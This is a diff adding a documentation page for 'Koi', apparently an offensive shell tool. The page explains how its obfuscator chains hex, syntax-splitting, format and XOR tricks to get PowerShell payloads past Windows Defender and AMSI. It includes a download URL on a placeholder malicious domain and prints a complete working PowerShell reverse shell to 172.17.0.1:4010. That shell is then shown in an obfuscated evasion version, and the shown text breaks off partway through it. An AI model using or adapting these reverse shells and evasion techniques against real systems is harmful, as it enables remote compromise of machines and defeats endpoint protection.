@@ -1,0 +1,1143 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://b3rt1ng.github.io/koi-wiki/payloads/">
+      
+      
+        <link rel="prev" href="..">
+      
+      
+        <link rel="next" href="../upgrading-sessions/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../assets/images/logo.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>Generate Payloads - Koi Documentation</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#there-are-two-ways-to-make-payloads" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="Koi Documentation" class="md-header__button md-logo" aria-label="Koi Documentation" data-md-component="logo">
+      
+  <img src="../assets/images/logo.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Koi Documentation
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Generate Payloads
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="custom" data-md-color-accent="custom"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="Koi Documentation" class="md-nav__button md-logo" aria-label="Koi Documentation" data-md-component="logo">
+      
+  <img src="../assets/images/logo.png" alt="logo">
+
+    </a>
+    Koi Documentation
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Generate Payloads
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Generate Payloads
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#the-easy-way" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The easy way
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#the-advanced-way" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The advanced way
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="The advanced way">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#for-windows" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        For Windows
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="For Windows">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-hexadecimal-encoding-hex" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Hexadecimal Encoding (hex)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-syntax-splitting-syntax" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Syntax Splitting (syntax)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-string-formatting-format" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. String Formatting (format)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-dynamic-xor-encryption-xor" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Dynamic XOR Encryption (xor)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a-bit-of-practice" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        A bit of practice
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#for-linux" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        For Linux
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="For Linux">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-ansi-c-quoting-ansi_c" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. ANSI-C Quoting (ansi_c)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-printf-hex-encoding-printf_hex" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Printf Hex Encoding (printf_hex)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-empty-quote-injection-quote_insert" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Empty Quote Injection (quote_insert)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-variable-token-splitting-var_split" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Variable Token Splitting (var_split)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-base64-full-encoding-base64" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. Base64 Full Encoding (base64)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6-environment-storage-eval-ifs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. Environment Storage Eval (ifs)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#7-argument-vector-spoofing-spoof_argv" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. Argument Vector Spoofing (spoof_argv)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#last-words" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Last words
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../upgrading-sessions/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Upgrading Sessions
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../make-your-modules/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Module Development
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../future-updates/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Future Updates
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#the-easy-way" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The easy way
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#the-advanced-way" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The advanced way
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="The advanced way">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#for-windows" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        For Windows
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="For Windows">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-hexadecimal-encoding-hex" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Hexadecimal Encoding (hex)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-syntax-splitting-syntax" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Syntax Splitting (syntax)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-string-formatting-format" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. String Formatting (format)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-dynamic-xor-encryption-xor" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Dynamic XOR Encryption (xor)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a-bit-of-practice" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        A bit of practice
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#for-linux" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        For Linux
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="For Linux">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-ansi-c-quoting-ansi_c" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. ANSI-C Quoting (ansi_c)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-printf-hex-encoding-printf_hex" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Printf Hex Encoding (printf_hex)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-empty-quote-injection-quote_insert" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Empty Quote Injection (quote_insert)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-variable-token-splitting-var_split" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Variable Token Splitting (var_split)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-base64-full-encoding-base64" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. Base64 Full Encoding (base64)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6-environment-storage-eval-ifs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. Environment Storage Eval (ifs)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#7-argument-vector-spoofing-spoof_argv" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. Argument Vector Spoofing (spoof_argv)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#last-words" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Last words
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="there-are-two-ways-to-make-payloads">There are two ways to make payloads</h1>
+<h2 id="the-easy-way">The easy way</h2>
+<p>by just typing <code>payloads</code> followed by the interface you want to use, you will get basic payloads both for linux and windows :</p>
+<p><img alt="a set of basic payloads" src="../assets/images/basic_payloads.png" /></p>
+<p>Those are generic payloads, easy to use, straight forward. But sometimes you will need some more advanced payloads...</p>
+<h2 id="the-advanced-way">The advanced way</h2>
+<p>Koi has a built in obfuscator tool presented as an interactive plug and play, obfuscation chainer.</p>
+<p>By running <code>obfuscator</code>, you will be asked to chose your interface</p>
+<p><img alt="you need to select your interface" src="../assets/images/obfuscator_intro.png" /></p>
+<p>Once done, you will get a similar menu to select either a Linux or a Windows payload.</p>
+<h3 id="for-windows">For Windows</h3>
+<p>The obfuscator has been made originally to bypass modern security solutions like Windows Defender (AMSI). You will be presented with <code>4</code> methods, and here I will have to go a little bit on the details.</p>
+<hr />
+<h4 id="1-hexadecimal-encoding-hex">1. Hexadecimal Encoding (<code>hex</code>)</h4>
+<p>This method hunts down all plain text strings enclosed in single quotes within your payload and converts them into an array of hexadecimal bytes. </p>
+<ul>
+<li><strong>How it works:</strong> Instead of leaving strings in cleartext (which antivirus software can easily flag), Koi replaces them with a dynamic .NET reflection call: <code>[System.Text.Encoding]::UTF8.GetString()</code>.</li>
+<li><strong>Before:</strong>
+    <div class="highlight"><pre><span></span><code><span class="s1">&#39;[http://malicious-domain.local/shell.exe](http://malicious-domain.local/shell.exe)&#39;</span>
+</code></pre></div></li>
+<li><strong>After:</strong>
+    <div class="highlight"><pre><span></span><code><span class="p">(</span><span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="no">[byte[]]</span><span class="p">(</span><span class="n">0x68</span><span class="p">,</span><span class="n">0x74</span><span class="p">,</span><span class="n">0x74</span><span class="p">,</span><span class="n">0x70</span><span class="p">,</span><span class="n">0x3A</span><span class="p">,</span><span class="n">0x2F</span><span class="p">,</span><span class="n">0x2F</span><span class="p">...)))</span>
+</code></pre></div></li>
+</ul>
+<h4 id="2-syntax-splitting-syntax">2. Syntax Splitting (<code>syntax</code>)</h4>
+<p>Antivirus engines heavily monitor specific PowerShell cmdlets (like <code>Invoke-Expression</code>, <code>New-Object</code>, or <code>iex</code>). This method breaks down known dangerous keywords so they never appear consecutively in the script file.</p>
+<ul>
+<li><strong>How it works:</strong> Koi randomly picks a split point inside the critical cmdlet, cuts it into two distinct string fragments, and glues them back together using the string concatenation operator (<code>+</code>) inside an execution block <code>&amp;(...)</code>.</li>
+<li><strong>Before:</strong>
+    <div class="highlight"><pre><span></span><code><span class="nb">Invoke-Expression</span>
+</code></pre></div></li>
+<li><strong>After (Randomly generated):</strong>
+    <div class="highlight"><pre><span></span><code><span class="p">&amp;(</span> <span class="s1">&#39;Inv&#39;</span> <span class="p">+</span> <span class="s1">&#39;oke-Expression&#39;</span> <span class="p">)</span>
+</code></pre></div></li>
+</ul>
+<h4 id="3-string-formatting-format">3. String Formatting (<code>format</code>)</h4>
+<p>This technique leverages PowerShell's built-in format operator (<code>-f</code>) to randomize the order and appearance of sensitive strings.</p>
+<ul>
+<li><strong>How it works:</strong> The obfuscator chops a string into multiple pieces, scrambles them as parameters, and reconstructs them using randomly assigned index placeholders (<code>{0}{1}{2}</code>). To static analysis tools, it looks like a harmless formatting layout.</li>
+<li><strong>Before:</strong>
+    <div class="highlight"><pre><span></span><code><span class="s1">&#39;Net.WebClient&#39;</span>
+</code></pre></div></li>
+<li><strong>After (Randomly generated):</strong>
+    <div class="highlight"><pre><span></span><code><span class="p">(</span><span class="s1">&#39;{0}{1}&#39;</span> <span class="o">-f</span> <span class="s1">&#39;Net.&#39;</span><span class="p">,</span> <span class="s1">&#39;WebClient&#39;</span><span class="p">)</span>
+</code></pre></div></li>
+</ul>
+<h4 id="4-dynamic-xor-encryption-xor">4. Dynamic XOR Encryption (<code>xor</code>)</h4>
+<p>The most robust layer available in the tool. It completely encrypts your payload strings dynamically.</p>
+<ul>
+<li><strong>How it works:</strong> For every single string, Koi generates a random mathematical key (between 1 and 255) and an unpredictable variable name. It applies a <code>Bitwise XOR</code> (<code>-bxor</code>) operation to the bytes. When PowerShell runs the script, it decrypts the string <em>in-memory</em> on the fly. No security scanner can guess the content without emulating the execution loop.</li>
+<li><strong>Before:</strong>
+    <div class="highlight"><pre><span></span><code><span class="s1">&#39;DownloadString&#39;</span>
+</code></pre></div></li>
+<li><strong>After (Randomly generated):</strong>
+    <div class="highlight"><pre><span></span><code><span class="p">$(</span><span class="nv">$k4732</span><span class="p">=</span><span class="n">142</span><span class="p">;</span><span class="nv">$b</span><span class="p">=</span><span class="no">[byte[]]</span><span class="p">(</span><span class="n">0xca</span><span class="p">,</span><span class="n">0x99</span><span class="p">,</span><span class="n">0x9b</span><span class="p">,</span><span class="n">0x92</span><span class="p">...);</span><span class="n">-join</span><span class="p">(</span><span class="nv">$b</span><span class="p">|%{</span><span class="no">[char]</span><span class="p">(</span><span class="nv">$_</span><span class="o">-bxor</span><span class="nv">$k4732</span><span class="p">)}))</span>
+</code></pre></div></li>
+</ul>
+<hr />
+<h4 id="a-bit-of-practice">A bit of practice</h4>
+<p>You can combine these methods ! </p>
+<p>For example, running <code>syntax</code> then <code>xor</code> on top of your payload drastically changes the entropy and structure of the script, increasing your chances of bypassing Windows Defender.</p>
+<p>Let's have an example.</p>
+<p><div class="highlight"><pre><span></span><code><span class="nv">$client</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">Sockets</span><span class="p">.</span><span class="n">TCPClient</span><span class="p">(</span><span class="s1">&#39;172.17.0.1&#39;</span><span class="p">,</span> <span class="n">4010</span><span class="p">)</span>
+<span class="nv">$stream</span> <span class="p">=</span> <span class="nv">$client</span><span class="p">.</span><span class="n">GetStream</span><span class="p">()</span>
+<span class="no">[byte[]]</span><span class="nv">$bytes</span> <span class="p">=</span> <span class="n">0</span><span class="p">..</span><span class="n">65535</span> <span class="p">|</span> <span class="p">%{</span> <span class="n">0</span> <span class="p">}</span>
+
+<span class="k">while</span> <span class="p">((</span><span class="nv">$i</span> <span class="p">=</span> <span class="nv">$stream</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-ne</span> <span class="n">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$data</span> <span class="p">=</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">Text</span><span class="p">.</span><span class="n">ASCIIEncoding</span><span class="p">).</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$i</span><span class="p">)</span>
+    <span class="nv">$sendback</span> <span class="p">=</span> <span class="p">(</span><span class="nb">iex </span><span class="nv">$data</span> <span class="n">2</span><span class="p">&gt;&amp;</span><span class="n">1</span> <span class="p">|</span> <span class="nb">Out-String</span><span class="p">)</span>
+    <span class="nv">$sendback2</span> <span class="p">=</span> <span class="nv">$sendback</span> <span class="p">+</span> <span class="s1">&#39;PS &#39;</span> <span class="p">+</span> <span class="p">(</span><span class="n">pwd</span><span class="p">).</span><span class="n">Path</span> <span class="p">+</span> <span class="s1">&#39;&gt; &#39;</span>
+    <span class="nv">$sendbyte</span> <span class="p">=</span> <span class="p">(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">)</span>
+    <span class="nv">$stream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$sendbyte</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span>
+    <span class="nv">$stream</span><span class="p">.</span><span class="n">Flush</span><span class="p">()</span>
+<span class="p">}</span>
+
+<span class="nv">$client</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+</code></pre></div>
+This payload is the classic common powershell reverse shell. Defender instantly flags it.</p>
+<p><img alt="oh no :(" src="../assets/images/powershell_blocked.png" /></p>
+<p>But if we add a <code>format</code> and <code>syntax</code> chain, we get a payload such as :
+<div class="highlight"><pre><span></span><code><span class="nv">$client</span> <span class="p">=</span> <span class="p">&amp;(</span><span class="s2">&quot;N&quot;</span> <span class="p">+</span> <span class="s2">&quot;ew-Object&quot;</span><span class="p">)</span> <span class="n">Net</span><span class="p">.</span><span class="n">Sockets</span><span class="p">.</span><span class="n">TCPClient</span><span class="p">((</span><span class="s1">&#39;{0}{1}{2}&#39;</span> <span class="o">-f</span> <span class="s1">&#39;172.1&#39;</span><span class="p">,</span> <span class="s1">&#39;7.&#39;</span><span class="p">,</span> <span class="s1">&#39;0.1&#39;</span><span class="p">),</span> <span class="n">4010</span><span class="p">)</span>
+<span class="nv">$stream</span> <span class="p">=</span> <span class="nv">$client</span><span class="p">.</span><span class="n">GetStream</span><span class="p">()</span>
+<span class="no">[byte[]]</span><span class="nv">$bytes</span> <span class="p">=</span> <span class="n">0</span><span class="p">..</span><span class="n">65535</span> <span class="p">|</span> <span class="p">%{</span> <span class="n">0</span> <span class="p">}</span>
+
+<span class="k">while</span> <span class="p">((</span><span class="nv">$i</span> <span class="p">=</span> <span class="nv">$stream</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-ne</span> <span class="n">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$data</span> <span class="p">=</span> <span class="p">(&amp;(</span><span class="s1">&#39;N&#39;</span> <span class="p">+</span> <span class="s1">&#39;ew-Object&#39;</span><span class="p">)</span> <span class="n">Text</span><span class="p">.</span><span class="n">ASCIIEncoding</span><span class="p">).</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$i</span><span class="p">)</span>
+    <span class="nv">$sendback</span> <span class="p">=</span> <span class="p">(&amp;(</span><span class="s1">&#39;i&#39;</span> <span class="p">+</span> <span class="s1">&#39;ex&#39;</span><span class="p">)</span> <span class="nv">$data</span> <span class="n">2</span><span class="p">&gt;&amp;</span><span class="n">1</span> <span class="p">|</span> <span class="p">&amp;(</span><span class="s1">&#39;Out-S&#39;</span> <span class="p">+</span> <span class="s1">&#39;tring&#39;</span><span class="p">))</span>
